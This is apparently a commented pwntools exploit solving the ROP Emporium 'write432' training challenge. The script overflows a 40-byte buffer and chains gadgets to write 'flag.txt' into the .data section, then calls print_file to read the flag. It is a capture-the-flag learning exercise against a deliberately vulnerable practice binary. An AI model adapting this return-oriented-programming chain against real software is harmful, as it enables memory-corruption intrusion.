
from pwn import *
from pprint import pprint
offset = 40

context.arch = 'i386'

elf = ELF("./write432")
p = elf.process()


print(p.recvuntil(b">"))
# let's first determine where everything is:
# pprint(elf.symbols)

# let's print out some addresses and double-check with gdb 
#   print("data start:", p32(elf.symbols["data_start"]))
#   print("useful gagdets is at: ", p32(elf.symbols["usefulGadgets"]))
#   print("print_file@plt is located at: " , p32(elf.symbols["plt.print_file"]))
#   print("print_file is located at: " , p32(elf.symbols["print_file"]))


# Crafting variable for our payload :)

# use rop object to locate gadgets in memory
rop = ROP(elf)

# buffer is 40 A's
buf = b"A"*offset

# fake ebp
fake_ebp = b"BBBB"

# printint out rop gadget to make sure that it reads: "pop edi ; pop ebp ; ret"
print("rop gadget 1 is at: ", p32(rop.edi.address))

# it does, so put it into a variable for our payload
rop_gadget1_addr =  p32(rop.edi.address)

# locate the start of the .data section header 
data_addr = p32(elf.symbols["data_start"])

# first value we're popping is edi... since we want *edi = ebp = "flag", set edi to .data address
# this is because we're writing the string "flag" to memory starting at the .data section
edi = data_addr

# ebp = "flag"
ebp = b"flag"

# get addr of usefulGadget, our second ROP gadget
useful_Gadget_addr = p32(elf.symbols["usefulGadgets"]) 

#rop_gadget1_addr stays same, because we will still be using that first ROP gadget to pop edi and ebp

#edi is now data_addr + 0x4, since we are writing 4 more Bytes, and this is a 32-bit process
edi2 = p32(elf.symbols["data_start"] + 4)

#ebp is now ".txt":
ebp2 = b".txt"

# get the address of the print_file function--this is our final function that we are leveraging in order to open the "flag.txt" file
print_file_addr = p32(elf.symbols["plt.print_file"])

# when the program calls print_file, the stack should have an eip at the top (at lower memory address), then arguments below it (at higher memory addresses)... this eip is necessary so that the print_file function knows where to return to after opening our file. However, it is even more important for stack offsets. The program is going to use ebp indexing to determine where its arguments are. It'll expect a value at eip, even though eip isn't properly used and causes a segfault. 
fake_eip = b"dddd"

# our arguments 
args = data_addr

payload = [
        buf,                    #bunch of A's
        fake_ebp,               # BBBB
        rop_gadget1_addr,       # addr of "pop edi; pop ebp; ret;"
        edi,                    # addr of start of .data section header
        ebp,                    # "flag"
        useful_Gadget_addr,     # addr of useful gadget = mov [edi], ebp
        rop_gadget1_addr,       # addr of "pop edi; pop ebp; ret;"
        edi2,                   # addr of start of .data section header + 0x4
        ebp2,                   # ".txt"
        useful_Gadget_addr,     # addr of useful gadget = mov [edi], ebp
        print_file_addr,        # addr of print_file in usefulFunction
        fake_eip,               # addr of fake eip = "dddd"
        args                    # arguments for print_file fxn = address of .data section header
        ]

payload = b"".join(payload)
print("payload is: ", payload)

p.send(payload)


print(p.recvall())
p.close()

